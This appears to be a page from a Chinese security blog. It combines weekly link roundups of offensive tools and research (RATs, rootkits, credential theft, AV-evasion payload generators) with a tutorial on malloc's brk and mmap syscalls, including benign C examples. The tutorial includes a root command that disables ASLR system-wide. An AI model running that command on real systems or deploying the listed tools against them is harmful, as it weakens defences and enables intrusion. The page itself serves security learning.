+<li>RDP 劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话以实现横向渗透<br><a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#x64;&#x69;&#117;&#109;&#x2e;&#99;&#x6f;&#x6d;&#x2f;&#64;&#x6e;&#x65;&#116;&#119;&#x6f;&#x72;&#x6b;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#x79;&#x2f;&#114;&#x64;&#x70;&#x2d;&#x68;&#x69;&#106;&#x61;&#x63;&#x6b;&#x69;&#x6e;&#103;&#x2d;&#x68;&#111;&#x77;&#x2d;&#116;&#111;&#x2d;&#104;&#105;&#x6a;&#97;&#x63;&#107;&#x2d;&#x72;&#x64;&#115;&#x2d;&#97;&#110;&#x64;&#x2d;&#114;&#x65;&#x6d;&#111;&#x74;&#101;&#x61;&#112;&#x70;&#x2d;&#115;&#101;&#115;&#x73;&#105;&#111;&#x6e;&#115;&#x2d;&#116;&#x72;&#x61;&#110;&#x73;&#x70;&#97;&#x72;&#101;&#110;&#116;&#108;&#x79;&#x2d;&#116;&#111;&#x2d;&#109;&#111;&#x76;&#101;&#45;&#116;&#x68;&#114;&#x6f;&#x75;&#103;&#104;&#x2d;&#97;&#110;&#45;&#100;&#x61;&#x32;&#97;&#x31;&#101;&#55;&#51;&#x61;&#53;&#102;&#54;">&#x68;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#47;&#109;&#101;&#x64;&#x69;&#117;&#109;&#x2e;&#99;&#x6f;&#x6d;&#x2f;&#64;&#x6e;&#x65;&#116;&#119;&#x6f;&#x72;&#x6b;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#x79;&#x2f;&#114;&#x64;&#x70;&#x2d;&#x68;&#x69;&#106;&#x61;&#x63;&#x6b;&#x69;&#x6e;&#103;&#x2d;&#x68;&#111;&#x77;&#x2d;&#116;&#111;&#x2d;&#104;&#105;&#x6a;&#97;&#x63;&#107;&#x2d;&#x72;&#x64;&#115;&#x2d;&#97;&#110;&#x64;&#x2d;&#114;&#x65;&#x6d;&#111;&#x74;&#101;&#x61;&#112;&#x70;&#x2d;&#115;&#101;&#115;&#x73;&#105;&#111;&#x6e;&#115;&#x2d;&#116;&#x72;&#x61;&#110;&#x73;&#x70;&#97;&#x72;&#101;&#110;&#116;&#108;&#x79;&#x2d;&#116;&#111;&#x2d;&#109;&#111;&#x76;&#101;&#45;&#116;&#x68;&#114;&#x6f;&#x75;&#103;&#104;&#x2d;&#97;&#110;&#45;&#100;&#x61;&#x32;&#97;&#x31;&#101;&#55;&#51;&#x61;&#53;&#102;&#54;</a></li>
+<li>Protecting Against HSTS Abuse<br><a href="https://webkit.org/blog/8146/protecting-against-hsts-abuse/" target="_blank" rel="external">https://webkit.org/blog/8146/protecting-against-hsts-abuse/</a></li>
+<li>Tokenvator - 操作 Windows Tokens 进行提权的工具<br><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="external">https://github.com/0xbadjuju/Tokenvator</a></li>
+<li>Defending Microsoft environments at scale，大规模 Microsoft 环境的防御方案<br><a href="https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view" target="_blank" rel="external">https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view</a></li>
+<li>go-fuzz 使用指南，来自 GopherConRu 18 大会<br><a href="https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide" target="_blank" rel="external">https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide</a></li>
+<li>十种进程注入技术介绍<br><a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="external">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></li>
+<li>Internal-Monologue - 在不触碰 LSASS 的情况下抓取 NTLM Hashes 的攻击方式<br><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="external">https://github.com/eladshamir/Internal-Monologue</a></li>
+<li>滥用 LAPS 实现持久化控制<br><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="external">https://rastamouse.me/2018/03/laps---part-2/</a></li>
+<li>Pwn a ARM Router Step by Step<br><a href="https://xianzhi.aliyun.com/forum/topic/2184" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/2184</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/18/malloc的系统调用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/18/malloc的系统调用/" itemprop="url">
+                  malloc的系统调用
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-18T01:27:46+08:00">
+                2018-03-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>和<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>。<h4 id="prco-pid-maps文件"><a href="#prco-pid-maps文件" class="headerlink" title="/prco/$pid/maps文件"></a>/prco/$pid/maps文件</h4></li>
+<li>先来简单看下这个文件，这个文件会显示整个进程的地址空间分布情况。<br><img src="/2018/03/18/malloc的系统调用/maps.png" alt=""><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4></li>
+<li>brk从内核获取内存是通过增加程序中断地址方式的，开始于start_brk,结束于brk，初始的时候两者都指向的是同一个位置。</li>
+<li>当ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的</li>
+<li>当ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。<br><img src="/2018/03/18/malloc的系统调用/linuxFlexibleAddressSpaceLayout.png" alt=""><br>nice pic，ah</li>
+<li>如上图虚拟内存地址空间分布图所示，start_brk即是堆空间的开始，brk即是堆空间的结束。</li>
+<li><p>!注意，后面的测试均是关闭ASLR后测试输出，此外测试系统使用的是ubuntu14.04.1X64操作系统。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">关闭ASLR的方法</div><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
+</li>
+<li><p>示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">/* sbrk and brk example */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        void *curr_brk, *tmp_brk = NULL;</div><div class="line"></div><div class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</div><div class="line"></div><div class="line">        /* sbrk(0) gives current program break location */</div><div class="line">        tmp_brk = curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* brk(addr) increments/decrements program break location */</div><div class="line">        brk(curr_brk+4096);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>输出分析：</p>
+</li>
+<li>在brk之前，我们可以看到是没有进程中是没有堆块的，因此 start_brk=brk=end_data=0x602000<br><img src="/2018/03/18/malloc的系统调用/brkbefore.png" alt=""></li>
+<li>当程序执行brk调用的时候，如下的输出，我们看到有了堆块,因此 start_brk=end_data=0x602000,此时</li>
+<li>start_brk=end_data=0x602000</li>
+<li>brk = 0x603000<br><img src="/2018/03/18/malloc的系统调用/brkafter.png" alt=""></li>
+<li>解释一下新增加的一行：这里602000-603000就是动态分配的地址空间，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
+<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4></li>
+<li><p>malloc使用<a href="https://elixir.bootlin.com/linux/v3.8/source/mm/mmap.c#L1285" target="_blank" rel="external">mmap</a>来创建一个私有的匿名映射块，私有的匿名映射块主要的目的就是分配新的内存。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Private anonymous mapping example using mmap syscall */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void static inline errExit(const char* msg)</div><div class="line">&#123;</div><div class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</div><div class="line">        exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        int ret = -1;</div><div class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</div><div class="line">        printf(&quot;Before mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        char* addr = NULL;</div><div class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</div><div class="line">        if (addr == MAP_FAILED)</div><div class="line">                errExit(&quot;mmap&quot;);</div><div class="line">        printf(&quot;After mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* Unmap mapped region. */</div><div class="line">        ret = munmap(addr, (size_t)132*1024);</div><div class="line">        if(ret == -1)</div><div class="line">                errExit(&quot;munmap&quot;);</div><div class="line">        printf(&quot;After munmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>输出分析：</p>
+</li>
+<li>在使用mmap之前：我们注意下面的一个内存地址段<br><img src="/2018/03/18/malloc的系统调用/mmapbefore.png" alt=""></li>
+<li>当我们通过mmap申请了132KB的空间的时候，看到如下图<br><img src="/2018/03/18/malloc的系统调用/mmapafter.png" alt=""><br>b7df0000-b7e12000 其中这段虚拟内存地址就包含了我们刚刚申请到132KB大小的地址空间</li>
+<li>其中b7df0000-b7e12000 是这个块的地址范围，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
+<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.</li>
+<li>当munmap之后，下面的输出我们可以看的到申请的内存被释放（变成原来的b7e11000-b7e12000），又交还给了操作系统。<br><img src="/2018/03/18/malloc的系统调用/aftermunmap.png" alt=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
+<li>在64位上brk和32的结果是相同的，但是mmap的会有不同，原因暂时不明。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
+<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Syscalls used by malloc.</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/12/20180312安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/12/20180312安全动态/" itemprop="url">
+                  20180312安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T12:55:39+08:00">
+                2018-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>Log every executed command to syslog (a.k.a. Snoopy Logger).<br><a href="https://github.com/a2o/snoopy" target="_blank" rel="external">https://github.com/a2o/snoopy</a></li>
+<li>An information security preparedness tool to do adversarial simulation.<br><a href="https://github.com/uber-common/metta" target="_blank" rel="external">https://github.com/uber-common/metta</a></li>
+<li>固件逆向介绍（Video）<br><a href="https://www.youtube.com/watch?v=GIU4yJn2-2A" target="_blank" rel="external">https://www.youtube.com/watch?v=GIU4yJn2-2A</a></li>
+<li>ELF 二进制中的定向函数 Fuzzing<br><a href="https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/" target="_blank" rel="external">https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/</a></li>
+<li>Unix system calls<br><a href="http://t.cn/REkcu67" target="_blank" rel="external">http://t.cn/REkcu67</a><br><a href="http://t.cn/REkcu6g" target="_blank" rel="external">http://t.cn/REkcu6g</a></li>
+<li>Sudohulk - 替换 sudo，利用 ptrace Hook execve 系统调用实现劫持<br><a href="https://github.com/hc0d3r/sudohulk" target="_blank" rel="external">https://github.com/hc0d3r/sudohulk</a></li>
+<li>rootstealer - 检测 Linux 中的 root 用户终端并注入自定义命令<br><a href="https://github.com/CoolerVoid/rootstealer" target="_blank" rel="external">https://github.com/CoolerVoid/rootstealer</a></li>
+<li><p>0d1n - 自动化 Web 安全扫描器<br><a href="https://github.com/CoolerVoid/0d1n" target="_blank" rel="external">https://github.com/CoolerVoid/0d1n</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c语言写的</div></pre></td></tr></table></figure>
+</li>
+<li><p>通过实践学习 Radare<br><a href="http://www.radare.org/get/THC2018.pdf" target="_blank" rel="external">http://www.radare.org/get/THC2018.pdf</a></p>
+</li>
+<li>Let’s Encrypt 宣布 ACME v2 和通配证书（wildcard）支持现已上线<br><a href="https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579" target="_blank" rel="external">https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579</a></li>
+<li>vbg - 通过 X11 转发会话在 SSH 客户端上注入 Keystrokes 的工具<br><a href="https://github.com/xfee/vbg" target="_blank" rel="external">https://github.com/xfee/vbg</a></li>
+<li>从 4.0.0 开始的所有版本的 Samba 存在认证用户修改任意用户密码的漏洞（CVE-2018-1050）<br><https: wiki.samba.org="" index.php="" cve-2018-1057=""></https:></li>
+<li>CredSSP 存在严重漏洞(CVE-2018-0886)允许攻击者通过 MS-RDP 服务在服务器上远程执行代码（Video）<br><a href="https://blog.preempt.com/security-advisory-credssp" target="_blank" rel="external">https://blog.preempt.com/security-advisory-credssp</a></li>
+<li>以 Firefox 做通信通道来绕过防火墙限制的探索<br><a href="https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980" target="_blank" rel="external">https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980</a></li>
+<li>C 编译器生成只包含可打印字符的可执行文件(Paper)<br><a href="http://www.cs.cmu.edu/~tom7/abc/paper.pdf" target="_blank" rel="external">http://www.cs.cmu.edu/~tom7/abc/paper.pdf</a></li>
+<li>打造 GSM 基站<br><a href="https://n0where.net/build-gsm-base-station" target="_blank" rel="external">https://n0where.net/build-gsm-base-station</a></li>
+<li>使用 GDB 进行进程注入<br><a href="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html" target="_blank" rel="external">https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html</a></li>
+<li>通过伪装图标的 JS 快捷方式调用 UNC 路径窃取用户 NetNTLM Hash<br><a href="https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/" target="_blank" rel="external">https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/</a></li>
+<li>uxss-db - UXSS 漏洞搜集仓库<br><a href="https://github.com/Metnew/uxss-db" target="_blank" rel="external">https://github.com/Metnew/uxss-db</a></li>
+<li>DockerAttack - 渗透测试用的 Docker 镜像<br><a href="https://github.com/ZephrFish/DockerAttack" target="_blank" rel="external">https://github.com/ZephrFish/DockerAttack</a></li>
+<li>getaltname - 从 SSL 证书中提取域名的工具<br><a href="https://github.com/franccesco/getaltname" target="_blank" rel="external">https://github.com/franccesco/getaltname</a></li>
+<li>RAT-via-Telegram - 利用 Telegram 进行 C&amp;C 通信的 Windows 远程控制工具<br><a href="https://github.com/Dviros/RAT-via-Telegram" target="_blank" rel="external">https://github.com/Dviros/RAT-via-Telegram</a></li>
+<li>Diamorphine - 适用于 Linux Kernels 2.6.x/3.x/4.x 内核的 LKM rootkit<br><a href="https://github.com/alex91ar/Diamorphine" target="_blank" rel="external">https://github.com/alex91ar/Diamorphine</a></li>
+<li>Regaxor 正则表达式模糊测试工具介绍<br><a href="https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit" target="_blank" rel="external">https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit</a></li>
+<li>arm_now - 帮助研究人员快速配置测试虚拟机的工具，支持多种 CPU 架构<br><a href="https://github.com/nongiach/arm_now" target="_blank" rel="external">https://github.com/nongiach/arm_now</a></li>
+<li>lazyrecon - 渗透测试前期情报自动化收集工具<br><a href="https://github.com/nahamsec/lazyrecon" target="_blank" rel="external">https://github.com/nahamsec/lazyrecon</a></li>
+<li>Linux Heap Exploitation Intro Series: Set you free()<br><a href="https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/" target="_blank" rel="external">https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/</a></li>
+<li>使用 Webhooks 绕过支付<br><a href="http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/" target="_blank" rel="external">http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/</a></li>
+<li>Microsoft checkedc: C 的扩展，向 C 中加入了边界检查<br><a href="https://github.com/Microsoft/checkedc" target="_blank" rel="external">https://github.com/Microsoft/checkedc</a></li>
+<li>Cobalt Strike PowerShell Payload 混淆以绕过 Windows Defender 防御<br><a href="http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/" target="_blank" rel="external">http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</a></li>
+<li>利用已签名程序 dvdplay.exe 做启动项的技巧<br><a href="http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/" target="_blank" rel="external">http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/</a></li>
+<li>Powershell-RAT - 基于 Python 的后门程序，使用 Gmail 通过附件将数据泄露出去<br><a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="external">https://github.com/Viralmaniar/Powershell-RAT</a></li>
+<li>区块链安全 - DAO攻击事件解析<br><a href="https://paper.seebug.org/544/" target="_blank" rel="external">https://paper.seebug.org/544/</a></li>
+<li>区块链安全 - 以太坊短地址攻击<br><a href="https://paper.seebug.org/545/" target="_blank" rel="external">https://paper.seebug.org/545/</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/05/20180305安全动态/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/05/20180305安全动态/" itemprop="url">
+                  20180305安全动态
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-05T13:27:54+08:00">
+                2018-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
+<li>编写 Bash 自动补全脚本<br><a href="https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html" target="_blank" rel="external">https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html</a></li>
+<li>使用 IDA Pro 和 X64dbg 逆向分析 Gootkit 恶意软件<br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be" target="_blank" rel="external">https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be</a></li>
+<li>C++ STL 库错误用法的检测<br><a href="https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html" target="_blank" rel="external">https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html</a></li>
+<li>Seth - 对 RDP 服务实施中间人攻击的工具，可从 RDP 连接中提取明文密码<br><a href="https://github.com/SySS-Research/Seth" target="_blank" rel="external">https://github.com/SySS-Research/Seth</a></li>
+<li>路由器 XSS 漏洞挖掘实例<br><a href="https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html" target="_blank" rel="external">https://mthbernardes.github.io/persistence/2018/03/02/hacking-into-NET-router-for-fun-and-profit.html</a></li>
+<li>爬虫基础篇[Web 漏洞扫描器]<br><a href="https://paper.seebug.org/537/" target="_blank" rel="external">https://paper.seebug.org/537/</a></li>
+<li>Gaining Domain Admin from Outside Active Directory，从域外获取域管权限<br><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" target="_blank" rel="external">https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html</a></li>
+<li>IDA操作知识记录<br><a href="https://juejin.im/entry/5a37674d6fb9a04514642358" target="_blank" rel="external">https://juejin.im/entry/5a37674d6fb9a04514642358</a></li>
+<li>Exim Off-by-one RCE: Exploiting CVE-2018-6789 with Fully Mitigations Bypassing<br><a href="https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/" target="_blank" rel="external">https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/</a></li>
+<li>Password Filter DLL在渗透测试中的应用<br><a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</a></li>
+<li>SharpShooter - Payload 生成器，可以生成能逃逸杀软、沙盒、EDR 检测的样本，支持多种格式（HTA/JS/JSE/VBA/VBE/VBS/WSF）<br><a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/" target="_blank" rel="external">https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/</a></li>
+<li>Stored XSS, and SSRF in Google using the Dataset Publishing Language<br><a href="https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html" target="_blank" rel="external">https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html</a></li>
+<li>PKI基础知识：如何管理证书存储<br><a href="https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/" target="_blank" rel="external">https://blogs.technet.microsoft.com/askpfeplat/2018/03/05/pki-basics-how-to-manage-the-certificate-store/</a></li>
+<li>Python-Rootkit - Python 远控，用于和 Meterpreter 建立会话<br><a href="https://github.com/islamTaha12/Python-Rootkit" target="_blank" rel="external">https://github.com/islamTaha12/Python-Rootkit</a></li>
+<li>Fastly 公司构建其 WAF 产品测试套件的方法<br><a href="https://www.fastly.com/blog/building-waf-test-harness" target="_blank" rel="external">https://www.fastly.com/blog/building-waf-test-harness</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/">
+
